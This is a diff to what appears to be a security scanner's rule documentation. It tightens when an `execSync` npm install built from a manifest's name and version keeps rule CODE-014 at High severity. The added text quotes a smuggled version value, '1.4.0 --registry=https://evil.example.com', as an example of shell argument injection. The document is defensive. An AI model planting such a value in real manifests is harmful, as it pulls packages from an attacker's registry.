@@ -422,6 +422,12 @@ weight; its rule id, severity and snippet change, and the snippet says why.
   `X` is a constant holding `` `${N}-${P}-${A}` `` where `N` is `<pj>.name`, `P` is
   `os.platform()` or `process.platform`, `A` is `os.arch()` or `process.arch`, and
   `<pj>` is `require('./package.json')` of that same manifest; `Y` is `<pj>.version`.
+  The manifest's `name` must be a valid npm package-name token and its `version`
+  (and every matching platform spec) a strict semver, because both are interpolated
+  into the `execSync` shell command: a `name` or `version` that carries whitespace or
+  a shell-significant character (`"1.4.0 --registry=https://evil.example.com"`) keeps
+  `CODE-014` High instead (npm's publish-time semver check does not protect a clone,
+  tarball or local install — Codex second review of #172, hunt finding H1).
   Every name is resolved through a single `const` declaration whose block encloses the
   use, with no reassignment, parameter, `catch`, `for…of`, destructuring or rest
   binding of the same name anywhere in the file, and the file contains no `eval(` or
